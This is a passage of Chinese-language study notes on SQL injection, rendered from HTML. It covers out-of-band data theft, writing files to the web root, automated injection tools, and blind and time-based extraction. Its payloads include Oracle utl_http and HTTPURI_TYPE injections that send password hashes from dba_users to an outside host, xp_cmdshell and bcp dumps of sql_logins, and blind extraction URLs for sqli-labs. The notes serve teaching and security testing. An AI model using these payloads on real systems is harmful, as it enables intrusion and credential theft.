punctuation\">,</span> recipient<span class=\"token punctuation\">,</span> cc<span class=\"token punctuation\">,</span> bcc<span class=\"token punctuation\">,</span> subject<span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">,</span> mime_type<span class=\"token punctuation\">,</span> priority<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"HTTP-DNS\"><a href=\"#HTTP-DNS\" class=\"headerlink\" title=\"HTTP/DNS\"></a>HTTP/DNS</h4><p>Oracle 还提供了两种执行 HTTP 请求的方法:UTL_ HTTP 和 HTTPURI TYPEoUTL_ HTTP 包和HTTPURI_TYPE对象类型默认授权给了公共角色，可以由数据库所有用户执行或通过 SQL注入加以执行。</p>\n<p>要想向远程系统发送SYS用户的哈希口令，可注入下列字符串：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">or</span> l<span class=\"token operator\">=</span>utl_http<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">(</span><span class=\"token string\">'http://www.orasploit.com/'</span><span class=\"token operator\">||</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> password <span class=\"token keyword\">from</span> dba_users <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>也可以借助于HTTPURI_TYPE对象类型，如下所示：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span>HTTPURI_TYPE<span class=\"token punctuation\">(</span><span class=\"token string\">'http://www.orasploit.com/'</span><span class=\"token operator\">||</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> password <span class=\"token keyword\">from</span> dba_users <span class=\"token keyword\">where</span> rownum<span class=\"token operator\">=</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>getclob<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果SQL查询写在URL内部，那么还可以通过域名系统(Domain Name System,DNS)查询来发送数据(最大为64字节)。该查询作用于外部站点</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span> utl_http<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">(</span><span class=\"token string\">'http://www.'</span><span class=\"token operator\">||</span><span class=\"token punctuation\">(</span>selectpasswordfromdba_userswhererownum<span class=\"token operator\">=</span>l<span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">'.orasploit.com/'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"文件系统\"><a href=\"#文件系统\" class=\"headerlink\" title=\"文件系统\"></a>文件系统</h4><p>如果攻击者拥有足够的写文件系统的权限，那么他就可以将查询结果重定向到Web服务器根目录下的一个文件中，之后他便可以使用浏览器来正常访问该文件。</p>\n<h5 id=\"SQL-Server-3\"><a href=\"#SQL-Server-3\" class=\"headerlink\" title=\"SQL Server\"></a>SQL Server</h5><p>检索sql_logins表中第一个用户的用户名和哈希，将该值重定向到文件系统的一个文本文件中</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- Declare needed variables</span>\n<span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@a</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@hash</span> nvarchar<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@fileid</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- Take the username and password hash of the first user in sql_logins </span>\n<span class=\"token comment\">-- and store it into the variable @hash</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">top</span> <span class=\"token number\">1</span> <span class=\"token variable\">@hash</span> <span class=\"token operator\">=</span> name <span class=\"token operator\">+</span><span class=\"token string\">'|'</span><span class=\"token operator\">+</span>master<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>fn_varbintohexstr<span class=\"token punctuation\">(</span>password_hash<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span>sql_logins<span class=\"token punctuation\">;</span> \n<span class=\"token comment\">-- Create a FileSystemObject pointing to the location of the desired file</span>\n<span class=\"token keyword\">EXEC</span> sp_OACreate <span class=\"token string\">'Scripting.FileSystemObject'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@a</span> <span class=\"token keyword\">OUT</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">EXEC</span> sp_OAMethod <span class=\"token variable\">@a</span><span class=\"token punctuation\">,</span><span class=\"token string\">'OpenTextFile'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@fileid</span> <span class=\"token keyword\">OUT</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'c:\\inetpub\\wwwroot\\hash.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- Write the @hash variable into that file</span>\n<span class=\"token keyword\">EXEC</span> sp_OAMethod <span class=\"token variable\">@fileid</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'WriteLine'</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">Null</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">@hash</span><span class=\"token punctuation\">;</span> \n<span class=\"token comment\">-- Destroy the objects that are not needed anymore</span>\n<span class=\"token keyword\">EXEC</span> sp_OADestroy <span class=\"token variable\">@fileid</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">EXEC</span> sp_OADestroy <span class=\"token variable\">@a</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>利用自带工具bcp.exe</p>\n<p>检索整张sql_logins表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> xp_cmdshell <span class=\"token string\">'bcp \"select * from sys.sql_logins\" queryout c:\\inetpub\\wwwroot\\hashes.txt -T -c'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"Mysql-2\"><a href=\"#Mysql-2\" class=\"headerlink\" title=\"Mysql\"></a>Mysql</h5><p>为确定用户是否拥有FILE权限，可使用下面两种查询之一进行测试</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> file_priv <span class=\"token keyword\">FROM</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span> <span class=\"token keyword\">WHERE</span> <span class=\"token keyword\">user</span> <span class=\"token operator\">=</span><span class=\"token string\">'username'</span> <span class=\"token comment\">-- MySQL 4/5</span>\n\n<span class=\"token keyword\">SELECT</span> grantee<span class=\"token punctuation\">,</span>is_grantable <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span>user_privileges <span class=\"token keyword\">WHERE</span> privilege_type <span class=\"token operator\">=</span> <span class=\"token string\">'file'</span> <span class=\"token operator\">AND</span> grantee <span class=\"token operator\">=</span><span class=\"token string\">'username'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>假设用户拥有这样的权限，而且知道Web站点的根目录为/webroot/且MySQL用户能够对该目录进行写访问，那么可注入下列查询：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> table_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">'/webroot/tables.txt'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"Oracle-4\"><a href=\"#Oracle-4\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h5><p>在Oracle中，大多数用于访问文件的方法(UTL_FILE、DBMS_LOB外部表和Java)都需要一个PL/SQL注入漏洞，因而无法被用到SQL注入场景中。</p>\n<h5 id=\"在移动设备上实施SQL注入\"><a href=\"#在移动设备上实施SQL注入\" class=\"headerlink\" title=\"在移动设备上实施SQL注入\"></a>在移动设备上实施SQL注入</h5><p>SQLite</p>\n<p>建立监听通信</p>\n<h3 id=\"自动利用SQL注入\"><a href=\"#自动利用SQL注入\" class=\"headerlink\" title=\"自动利用SQL注入\"></a>自动利用SQL注入</h3><h4 id=\"Sqlmap\"><a href=\"#Sqlmap\" class=\"headerlink\" title=\"Sqlmap\"></a>Sqlmap</h4><p><a href=\"http://sqlmap.sourceforge.net/\">http://sqlmap.sourceforge.net</a></p>\n<h4 id=\"Bobcat\"><a href=\"#Bobcat\" class=\"headerlink\" title=\"Bobcat\"></a>Bobcat</h4><p><a href=\"http://www.northem-monkee.co.uk/projects/bobcat/bobcat.html\">www.northem-monkee.co.uk/projects/bobcat/bobcat.html</a></p>\n<h4 id=\"BSQL\"><a href=\"#BSQL\" class=\"headerlink\" title=\"BSQL\"></a>BSQL</h4><p><a href=\"http://code.google.eom/p/bsqlhacker/\">http://code.google.eom/p/bsqlhacker/</a></p>\n<h4 id=\"其他-1\"><a href=\"#其他-1\" class=\"headerlink\" title=\"其他\"></a>其他</h4><ul>\n<li><p>FG-Injection Framework (<a href=\"http://sourceforge.net/projects/injection-fwk/\">http://sourceforge.net/projects/injection-fwk/</a>)</p>\n</li>\n<li><p>Havij (<a href=\"http://itsecteam.com/en/projects/projectl.htm\">http://itsecteam.com/en/projects/projectl.htm</a>)</p>\n</li>\n<li><p>Sqllnjector (<a href=\"http://www.woanware.co.uk/?page_id=19\">http://www.woanware.co.uk/?page_id=19</a>)</p>\n</li>\n<li><p>SQLGET (<a href=\"http://www.infbbytecom.ar/\">www.infbbytecom.ar</a>)</p>\n</li>\n<li><p>Sqlsus (<a href=\"http://sqlsus.sourcefbrge.net/\">http://sqlsus.sourcefbrge.net/</a>)</p>\n</li>\n<li><p>Pangolin (<a href=\"http://www.nosec-inc.com/en/products/pangolin/\">http://www.nosec-inc.com/en/products/pangolin/</a>)</p>\n</li>\n<li><p>Absinthe (<a href=\"http://0x90.org/releases/absinthe/\">http://0x90.org/releases/absinthe/</a>)</p>\n</li>\n</ul>\n<h2 id=\"SQL盲注利用\"><a href=\"#SQL盲注利用\" class=\"headerlink\" title=\"SQL盲注利用\"></a>SQL盲注利用</h2><p>在发现一个SQL注入点时，只返回一个简单错误提示，返回的内容并不能完美的达到预期，这时我们能注入不同的内容注入产生不同回应，通过差异判断注入是否成功，这就是SQL盲注，通常是自动化利用</p>\n<h3 id=\"寻找并确认SQL盲注\"><a href=\"#寻找并确认SQL盲注\" class=\"headerlink\" title=\"寻找并确认SQL盲注\"></a>寻找并确认SQL盲注</h3><h4 id=\"强制产生通用错误\"><a href=\"#强制产生通用错误\" class=\"headerlink\" title=\"强制产生通用错误\"></a>强制产生通用错误</h4><p>通常提交单引号时最常见的错误源是受损的SQL查询</p>\n<h4 id=\"注入带副作用的查询\"><a href=\"#注入带副作用的查询\" class=\"headerlink\" title=\"注入带副作用的查询\"></a>注入带副作用的查询</h4><p>注入副作用的查询是为了让攻击者观察到，通常是注入时间延迟</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">waitfor</span> delay <span class=\"token string\">'0:0:5'</span>\n\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\npg_sleep<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> 注入不同的字符串产生不同的输出</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' and '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">2</span>  <span class=\"token comment\">-- 永假</span>\n<span class=\"token string\">' or '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span> <span class=\"token comment\">-- 永真</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"拆分与平衡\"><a href=\"#拆分与平衡\" class=\"headerlink\" title=\"拆分与平衡\"></a>拆分与平衡</h4><p>分解合法输入的操作称为拆分，平衡则保证最终的查询中不会包含不平衡的结尾单引号。其基本思想是：收集合法的请求参数，之后使用SQL关键字对它们进行修改以保证与原始数据不同， 但当数据库解析它们时，二者的功能是等价的。</p>\n<p>oracle中<code>||</code>连接两个字符串</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span>\n\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadB'</span><span class=\"token operator\">||</span><span class=\"token string\">'ob'</span>\n<span class=\"token comment\">-- 返回结果是相同的</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span> <span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review authors<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span> <span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review author<span class=\"token operator\">=</span><span class=\"token string\">'Mad'</span><span class=\"token operator\">+</span><span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x42</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'ob'</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span> <span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review author<span class=\"token operator\">=</span><span class=\"token string\">'Mad'</span><span class=\"token operator\">+</span><span class=\"token keyword\">SELECT</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'B'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'ob'</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span> <span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review author<span class=\"token operator\">=</span><span class=\"token string\">'Mad'</span><span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'B'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">'ob'</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span> <span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review author<span class=\"token operator\">=</span><span class=\"token string\">'Mad'</span><span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'Bob'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们可以看到，在其中注入了子查询，当然我们可以换成其他的漏洞代码</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/1635b29c12fca4d4f03c3fa7f6557976.png\"></p>\n<h4 id=\"常见的SQL盲注场景\"><a href=\"#常见的SQL盲注场景\" class=\"headerlink\" title=\"常见的SQL盲注场景\"></a>常见的SQL盲注场景</h4><p>1） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容可被适度控制的页面。这种情况通常出现在根据用户选择来显示信息的页面中。例如，用户点击一个包含id参数（能唯一识别数据库中的商品）的链接或者提交一个搜索请求。对于这两种情况，用户可控制页面提供的输出，因为该页面是根据用户提供的信息来生成的，比如提供一个产品的id，该页面还包含了从响应中获得的数据。</p>\n<p>因为页面提供了反馈信息（虽然不是以详细的数据库错误消息方式），所以可以使用基于时间的确认漏洞以及能够修改页面显示数据集的漏洞。例如，某个攻击可能会显示香皂或刷子的产品描述，以指示是否提取到了 0-bit或1-bit的数据。大多数情况下，只需提交一个单引号就足以破坏SQL查询平衡并强制产生一个通用的错误页面，这将有助于推断是否存在SQL注入漏洞。</p>\n<p>2） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容不可控的页面。当页面包含多个SQL查询，但只有第一个查询容易受到攻击且不产生输出时会碰到这种情况。还有一种场景也会引发这种情况：SQL注入位于 UPDATE或INSERT语句中，此时提交的信息虽然被写入数据库中且不产生输出，但却会产生通用的错误。</p>\n<p>使用单引号产生的通用错误页面可能会暴露这种页面（与基于时间的漏洞相同），但基于内容的攻击却不会。</p>\n<p>3） 提交受损或不正确的SQL既不会产生错误页面，也不会以任何方式影响页面输出。因 为这种类型的SQL盲注场景不返回错误，而基于时间的漏洞或产生带外副作用的漏洞则最有可能成功识别易受攻击的参数。</p>\n<h4 id=\"SQL盲注技术\"><a href=\"#SQL盲注技术\" class=\"headerlink\" title=\"SQL盲注技术\"></a>SQL盲注技术</h4><h5 id=\"推断攻击技术\"><a href=\"#推断攻击技术\" class=\"headerlink\" title=\"推断攻击技术\"></a>推断攻击技术</h5><p>当请求的位为1时，响应会有专门的标志；而当请求的位为0时，则会产生不同的响应。响应中的真正差异取决于所选用的推断工具，所使用的方法则大多基于响应时间、页面内容、页面错误或以上这些因素的组合。</p>\n<p>条件分支IF语句，攻击者能通过响应的不同推断出是哪个分支</p>\n<p>sqli-labs示例</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//sql/Less-8/?id=1</span>\n<span class=\"token comment\">#you are in</span>\nhttp:<span class=\"token comment\">//sql/Less-8/?id=1' and '1'='1</span>\n<span class=\"token comment\">#you are in</span>\nhttp:<span class=\"token comment\">//sql/Less-8/?id=1' and '1'='2</span>\n<span class=\"token comment\">#</span>\nhttp:<span class=\"token comment\">//sql/Less-8/?id=1' or '1'='1</span>\n<span class=\"token comment\">#you are in</span>\n<span class=\"token comment\">#可以看到有两种状态，空白和you are in</span>\nhttp:<span class=\"token comment\">//sql/Less-8/?id=1' and (ascii(substr((select database()),1,1)))=115 %23</span>\n<span class=\"token comment\">#you are in</span>\n可以判断数据库第一个字符是s\nhttp:<span class=\"token comment\">//sql/Less-8/?id=1' and (ascii(substr((select database()),2,1)))=101 %23</span>\n<span class=\"token comment\">#you are in</span>\n经过多次注入就能将数据全部检索出来\nhttp:<span class=\"token comment\">//sql/Less-8/?id=1' and (length(database()))=8 %23</span>\n<span class=\"token comment\">#you are in</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"增加推断攻击技术的复杂性\"><a href=\"#增加推断攻击技术的复杂性\" class=\"headerlink\" title=\"增加推断攻击技术的复杂性\"></a>增加推断攻击技术的复杂性</h5><ul>\n<li><p>二分搜素方法（分半算法）</p>\n<p>两种状态，添加第三种状态可以将最佳请求次数降为1，也可以自己创建字母表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Incubating<span class=\"token string\">' AND ASCII(SUBSTRING (SYSTEM USER, 1, 1)) &gt;127-- (False)\nIncubating'</span> <span class=\"token operator\">AND</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING <span class=\"token punctuation\">(</span>SYSTEM <span class=\"token keyword\">USER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">63</span><span class=\"token comment\">-- (True)</span>\nIncubating<span class=\"token string\">' AND ASCII(SUBSTRING (SYSTEM USER, 1, 1) )&gt;95-- (True)\nIncubating'</span> <span class=\"token operator\">AND</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING <span class=\"token punctuation\">(</span>SYSTEM <span class=\"token keyword\">USER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span><span class=\"token number\">111</span><span class=\"token comment\">-- (True)</span>\nIncubating<span class=\"token string\">' AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &gt;119-- (False)\nIncubating'</span> <span class=\"token operator\">AND</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING <span class=\"token punctuation\">(</span>SYSTEM <span class=\"token keyword\">USER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span><span class=\"token number\">115</span><span class=\"token comment\">-- (False)</span>\nIncubating<span class=\"token string\">' AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &gt;113-- (True)\nIncubating'</span> <span class=\"token operator\">AND</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING <span class=\"token punctuation\">(</span>SYSTEM <span class=\"token keyword\">USER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span><span class=\"token number\">114</span><span class=\"token comment\">-- (True)</span>\n\n<span class=\"token comment\">-- 自建字母表，优化二分法</span>\nIncubating<span class=\"token string\">' and SUBSTRING ('</span>c4ca4238a0b923820dcc509a6f75849b<span class=\"token string\">',1,1) in\n('</span><span class=\"token number\">0</span><span class=\"token string\">','</span><span class=\"token number\">1</span><span class=\"token string\">','</span><span class=\"token number\">2</span><span class=\"token string\">','</span><span class=\"token number\">3</span><span class=\"token string\">','</span><span class=\"token number\">4</span><span class=\"token string\">','</span><span class=\"token number\">5</span><span class=\"token string\">','</span><span class=\"token number\">6</span><span class=\"token string\">','</span><span class=\"token number\">7</span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>逐位方法</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/304ab8debee5bb56e02a5703f7ad7fba.png\"></p>\n<p>对每位（bit）进行比对</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Incubating<span class=\"token string\">'\nAND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp;\n128-128-- (False)\nIncubating'</span>\n<span class=\"token operator\">AND</span> ASCII <span class=\"token punctuation\">(</span>SUBSTRING <span class=\"token punctuation\">(</span>SYSTEM <span class=\"token keyword\">USER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>\n<span class=\"token number\">64</span><span class=\"token operator\">=</span><span class=\"token number\">64</span><span class=\"token comment\">-- (True)</span>\nIncubating<span class=\"token string\">'\nAND ASCII (SUBSTRING (SYSTEM USER, 1,1)) &amp;\n32=32-- (True)\nIncubating'</span>\n<span class=\"token operator\">AND</span> ASCII <span class=\"token punctuation\">(</span>SUBSTRING <span class=\"token punctuation\">(</span>SYSTEM <span class=\"token keyword\">USER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">&amp;</span> <span class=\"token number\">16</span><span class=\"token operator\">=</span><span class=\"token number\">16</span><span class=\"token comment\">-- (True)</span>\nIncubating<span class=\"token string\">' AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp; 8=8-- (False)\nIncubating'</span> <span class=\"token operator\">AND</span> ASCII <span class=\"token punctuation\">(</span>SUBSTRING <span class=\"token punctuation\">(</span>SYSTEM <span class=\"token keyword\">USER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">4</span><span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token comment\">-- (False)</span>\nIncubating<span class=\"token string\">'\nAND ASCII (SUBSTRING (SYSTEM USER, 1,1))\n&amp; 2=2-- (True)\nIncubating'</span>\n<span class=\"token operator\">AND</span> ASCII <span class=\"token punctuation\">(</span>SUBSTRING <span class=\"token punctuation\">(</span>SYSTEM <span class=\"token keyword\">USER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token comment\">-- (True)</span>\n\n<span class=\"token comment\">-- ture代表1，false代表0，比对出得到01110011，十进制115，字母s</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<h5 id=\"非主流通道技术\"><a href=\"#非主流通道技术\" class=\"headerlink\" title=\"非主流通道技术\"></a>非主流通道技术</h5><p>用的传输通道而非页面响应，它的传输通道包括DNS、e-mail和HTTP请求。非主流通道技术更重要的特点是：它们通常支持一次检索多块数据，而不是推断单个位或单个字节的值。</p>\n<h3 id=\"使用基于时间技术\"><a href=\"#使用基于时间技术\" class=\"headerlink\" title=\"使用基于时间技术\"></a>使用基于时间技术</h3><p>发出请求到响应到达这段时间的差异。当某一状态为真时，如果能够让响应暂停几秒钟， 而当状态为假时，能够不出现暂停</p>\n<h4 id=\"延迟数据库查询\"><a href=\"#延迟数据库查询\" class=\"headerlink\" title=\"延迟数据库查询\"></a>延迟数据库查询</h4><h5 id=\"Mysql延迟\"><a href=\"#Mysql延迟\" class=\"headerlink\" title=\"Mysql延迟\"></a>Mysql延迟</h5><p> 两个函数，sleep()，benchmark(n,expression)</p>\n<p>sleep(N)强制延迟N秒</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">xxx<span class=\"token punctuation\">.</span>php?canshu<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' union select if(substring(user(),1,4)='</span>root'<span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>benchmark(N,expression)执行表达式expression N次，通常表达式为一个函数，这样能增加执行时间</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">xxx<span class=\"token punctuation\">.</span>php?canshu<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' union select if(substring(user(),1,4)='</span>root'<span class=\"token punctuation\">,</span>benchmark<span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">,</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 